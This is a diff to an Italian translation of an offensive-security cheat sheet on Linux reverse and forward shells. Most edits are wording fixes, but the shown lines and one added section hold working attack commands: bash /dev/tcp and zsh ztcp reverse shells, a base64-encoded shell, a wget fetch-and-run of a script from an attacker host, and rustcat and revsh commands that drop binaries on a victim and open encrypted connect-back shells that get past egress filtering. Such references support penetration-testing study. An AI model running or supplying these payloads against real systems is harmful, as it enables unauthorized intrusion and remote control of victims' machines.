@@ -23,7 +23,7 @@ exec >&0
 ```
 Non dimenticare di controllare con altre shell: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.
 
-### Shell sicura dei simboli
+### Shell sicura per simboli
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -35,7 +35,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Spiegazione della shell
 
 1. **`bash -i`**: Questa parte del comando avvia una shell Bash interattiva (`-i`).
-2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) verso la **stessa destinazione**.
+2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) verso **la stessa destinazione**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
 - Reindirizzando **i flussi di output e di errore a questo file**, il comando invia effettivamente l'output della sessione della shell interattiva alla macchina dell'attaccante.
 4. **`0>&1`**: Questa parte del comando **reindirizza l'input standard (`stdin`) alla stessa destinazione dell'output standard (`stdout`)**.
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Quando si tratta di una vulnerabilità di **Remote Code Execution (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una reverse shell potrebbe essere ostacolato da difese di rete come le regole iptables o meccanismi di filtraggio dei pacchetti complessi. In tali ambienti ristretti, un approccio alternativo prevede l'istituzione di una shell PTY (Pseudo Terminal) per interagire con il sistema compromesso in modo più efficace.
+Quando si tratta di una vulnerabilità di **Remote Code Execution (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una reverse shell potrebbe essere ostacolato da difese di rete come le regole di iptables o meccanismi complessi di filtraggio dei pacchetti. In tali ambienti ristretti, un approccio alternativo prevede l'istituzione di una shell PTY (Pseudo Terminal) per interagire con il sistema compromesso in modo più efficace.
 
 Uno strumento consigliato per questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che semplifica l'interazione con l'ambiente target.
 
@@ -79,7 +79,7 @@ E poi, puoi eseguire:
 ```shell
 toboggan -m nix.py -i
 ```
-Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere il `-i` per un wrapper rce più basilare.
+Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere il `-i` per un wrapper RCE più basilare.
 
 Un'altra possibilità consiste nell'utilizzare l'implementazione della shell forward di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
@@ -87,9 +87,9 @@ Devi solo modificare:
 
 - L'URL dell'host vulnerabile
 - Il prefisso e il suffisso del tuo payload (se presenti)
-- Il modo in cui il payload viene inviato (headers? data? informazioni extra?)
+- Il modo in cui il payload viene inviato (headers? dati? informazioni extra?)
 
-Poi, puoi semplicemente **inviare comandi** o persino **usare il comando `upgrade`** per ottenere un PTY completo (nota che le pipe vengono lette e scritte con un ritardo approssimativo di 1,3 secondi).
+Poi, puoi semplicemente **inviare comandi** o persino **usare il comando `upgrade`** per ottenere un PTY completo (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (TCP integrato)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno simile a netcat scritto in Rust (incluso in Kali dal 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Features:
+- Flag `--ssl` opzionale per il trasporto crittografato (TLS 1.3)
+- `-s` per avviare qualsiasi binario (ad es. `/bin/sh`, `python3`) sulla vittima
+- `--up` per aggiornare automaticamente a un PTY completamente interattivo
+
+## revsh (crittografato e pronto per il pivoting)
+
+`revsh` è un piccolo client/server C che fornisce un TTY completo su un **tunnel Diffie-Hellman crittografato** e può opzionalmente allegare un'interfaccia **TUN/TAP** per il pivoting simile a una VPN inversa.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Utili flag:
+- `-b` : bind-shell invece di reverse
+- `-p socks5://127.0.0.1:9050` : proxy tramite TOR/HTTP/SOCKS
+- `-t` : crea un'interfaccia TUN (reverse VPN)
+
+Poiché l'intera sessione è crittografata e multiplexata, spesso bypassa il semplice filtraggio in uscita che ucciderebbe una shell in testo semplice `/dev/tcp`.
+
 ## OpenSSL
 
 L'Attaccante (Kali)
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
